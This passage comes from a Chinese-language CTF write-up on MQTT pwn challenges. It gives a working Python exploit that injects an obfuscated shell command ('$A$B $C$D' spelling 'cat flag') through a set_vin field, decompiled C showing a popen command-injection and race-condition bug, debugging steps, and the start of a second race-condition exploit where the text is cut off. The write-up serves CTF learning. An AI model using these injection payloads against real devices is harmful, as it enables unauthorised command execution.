+<p><img src="../images/mqtt4.png" alt=""></p>
+<p>最后语句执行</p>
+<p><img src="../images/mqtt5.png" alt=""></p>
+<p>因此，我们不妨构造<code>; A=c; B=at; C=fl; D=ag; $A$B $C$D;</code>截断echo便可以打印出flag。</p>
+<p>同时，在最后的代码里，输出的信息也会被重定向到CTF/send topic下，我们即可得到flag，十分可惜的是，我本想把flag内容重定向到version然后get_version输出的，但最终并没有找到合适的办法。最终exp如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">paho.mqtt</span> <span class="kn">import</span> <span class="n">client</span> <span class="k">as</span> <span class="n">mqtt_client</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">broker</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">topic</span> <span class="o">=</span> <span class="s2">&#34;CTF&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Generate a Client ID with the publish prefix.</span>
+</span></span><span class="line"><span class="cl"><span class="n">client_id</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;publish-</span><span class="si">{</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;public&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">connect_mqtt</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">on_connect</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">userdata</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">reasonCode</span><span class="p">,</span> <span class="n">properties</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">client</span><span class="o">.</span><span class="n">subscribe</span><span class="p">(</span><span class="s2">&#34;CTF&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">client</span><span class="o">.</span><span class="n">subscribe</span><span class="p">(</span><span class="s2">&#34;CTF/send&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Connected with result code </span><span class="si">{</span><span class="n">reasonCode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">on_message</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">userdata</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">message</span> <span class="o">=</span> <span class="n">msg</span><span class="o">.</span><span class="n">payload</span>  <span class="c1"># Decode message payload</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print(message)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">msg</span><span class="o">.</span><span class="n">topic</span> <span class="o">==</span> <span class="s2">&#34;CTF/send&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[RECV] Message: </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">msg</span><span class="o">.</span><span class="n">topic</span> <span class="o">==</span> <span class="s2">&#34;CTF&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[SEND] Message: </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="o">=</span> <span class="n">mqtt_client</span><span class="o">.</span><span class="n">Client</span><span class="p">(</span><span class="n">mqtt_client</span><span class="o">.</span><span class="n">CallbackAPIVersion</span><span class="o">.</span><span class="n">VERSION2</span><span class="p">,</span> <span class="n">client_id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">username_pw_set</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">on_connect</span> <span class="o">=</span> <span class="n">on_connect</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">on_message</span> <span class="o">=</span> <span class="n">on_message</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">broker</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">keepalive</span><span class="o">=</span><span class="mi">10000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">client</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">publish</span><span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">publish</span><span class="p">(</span><span class="n">topic</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_message</span><span class="p">(</span><span class="n">auth</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span> <span class="n">cho_cmd</span><span class="p">:</span><span class="nb">int</span><span class="p">,</span> <span class="n">arg</span><span class="p">:</span><span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">cho_cmd</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;get_version&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span><span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;set_vin&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">message</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;auth&#34;</span><span class="p">:</span> <span class="n">auth</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;cmd&#34;</span><span class="p">:</span> <span class="n">cmd</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;arg&#34;</span><span class="p">:</span> <span class="n">arg</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">message</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="o">=</span> <span class="n">connect_mqtt</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">loop_start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mes</span> <span class="o">=</span> <span class="n">send_message</span><span class="p">(</span><span class="s2">&#34;_w_=gj&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">publish</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">mes</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mes</span> <span class="o">=</span> <span class="n">send_message</span><span class="p">(</span><span class="s2">&#34;_w_=gj&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;; A=c; B=at; C=fl; D=ag; $A$B $C$D;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">publish</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">mes</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">loop_stop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">disconnect</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">run</span><span class="p">()</span>
+</span></span></code></pre></div><p><img src="../images/mqtt6.png" alt=""></p>
+<h1 id="challenge-3-ciscn-mqtt">challenge 3 Ciscn mqtt</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">start_routine</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-17Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">FILE</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-178h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-170h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-168h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-160h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">File</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-158h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">ptr</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-150h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-148h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [rsp+50h] [rbp-140h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+58h] [rbp-138h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [rsp+60h] [rbp-130h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [rsp+68h] [rbp-128h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [rsp+70h] [rbp-120h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// [rsp+78h] [rbp-118h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">264</span><span class="p">];</span> <span class="c1">// [rsp+80h] [rbp-110h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v18</span><span class="p">;</span> <span class="c1">// [rsp+188h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v18</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">sub_160E</span><span class="p">()</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">send</span><span class="p">(</span><span class="s">&#34;{</span><span class="se">\&#34;</span><span class="s">status</span><span class="se">\&#34;</span><span class="s">:</span><span class="se">\&#34;</span><span class="s">unauthorized</span><span class="se">\&#34;</span><span class="s">}&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;unauthorized&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;get_version&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">File</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">readFile</span><span class="p">(</span><span class="s">&#34;/mnt/version&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">File</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v2</span> <span class="o">=</span> <span class="n">File</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v2</span> <span class="o">=</span> <span class="s">&#34;error&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;get_location&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">readFile</span><span class="p">(</span><span class="s">&#34;/dev/location&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v2</span> <span class="o">=</span> <span class="n">v7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v2</span> <span class="o">=</span> <span class="s">&#34;error&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;get_tpms&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;set_adb&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v3</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">snprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x80uLL</span><span class="p">,</span> <span class="s">&#34;echo -n %d&gt;/mnt/adb_flag;cat /mnt/adb_flag&#34;</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">stream</span> <span class="o">=</span> <span class="nf">popen</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">ptr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v10</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v11</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v12</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v13</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v14</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v15</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v16</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="mh">0x3FuLL</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">pclose</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">send</span><span class="p">(</span><span class="s">&#34;invalid_flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;set_vin&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">sub_158A</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">sleep</span><span class="p">(</span><span class="mi">2u</span><span class="p">);</span> <span class="c1">//vuln
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nf">snprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">,</span> <span class="s">&#34;echo -n %s&gt;/mnt/VIN;cat /mnt/VIN&#34;</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v4</span> <span class="o">=</span> <span class="nf">popen</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">ptr</span> <span class="o">=</span> <span class="mh">0x203A746572LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v10</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v11</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v12</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v13</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v14</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v15</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">v16</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">fread</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="mh">0x3FuLL</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span><span class="c1">// raceCondition
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nf">pclose</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">strncpy</span><span class="p">(</span><span class="n">vin_code</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="mh">0x3FuLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">sub_1509</span><span class="p">(</span><span class="n">vin_code</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte_5080</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">send</span><span class="p">(</span><span class="s">&#34;invalid_vin&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;invalid_vin&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">send</span><span class="p">(</span><span class="s">&#34;unknown_command&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">readFile</span><span class="p">(</span><span class="s">&#34;/dev/tpms&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v2</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v2</span> <span class="o">=</span> <span class="s">&#34;error&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">send</span><span class="p">(</span><span class="n">v2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>本地调试的时候遇到了一点问题</p>
+<pre tabindex="0"><code>pwndbg&gt; set follow-fork-mode child
+pwndbg&gt; set detach-on-fork off
+pwndbg&gt; b fopen
+Breakpoint 1 at 0x13b0
+pwndbg&gt; r
+Starting program: /home/ldz/Downloads/mqtt3/pwn 
+warning: could not find &#39;.gnu_debugaltlink&#39; file for /home/ldz/Downloads/mqtt3/libpaho-mqtt3c.so.1
+warning: Unable to find libthread_db matching inferior&#39;s thread library, thread debugging will not be available.
+</code></pre><p>我们不妨</p>
+<pre tabindex="0"><code>ldz@ldz-OMEN-by-HP-Gaming-Laptop-16-wf0xxx:~/Downloads/mqtt3$ sudo cp /lib/x86_64-linux-gnu/libc.so.6 .
+[sudo] ldz 的密码： 
+ldz@ldz-OMEN-by-HP-Gaming-Laptop-16-wf0xxx:~/Downloads/mqtt3$ sudo cp /lib64/ld-linux-x86-64.so.2 .
+ldz@ldz-OMEN-by-HP-Gaming-Laptop-16-wf0xxx:~/Downloads/mqtt3$ patchelf --set-rpath . --set-interpreter ./ld-linux-x86-64.so.2 ./pwn
+</code></pre><p>题目的打法是条件竞争，只需要在sleep期间把args修改为cat flag即可</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">_thread</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">paho.mqtt</span> <span class="kn">import</span> <span class="n">client</span> <span class="k">as</span> <span class="n">mqtt_client</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">broker</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">topic</span> <span class="o">=</span> <span class="s2">&#34;diag&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Generate a Client ID with the publish prefix.</span>
+</span></span><span class="line"><span class="cl"><span class="n">client_id</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;publish-</span><span class="si">{</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
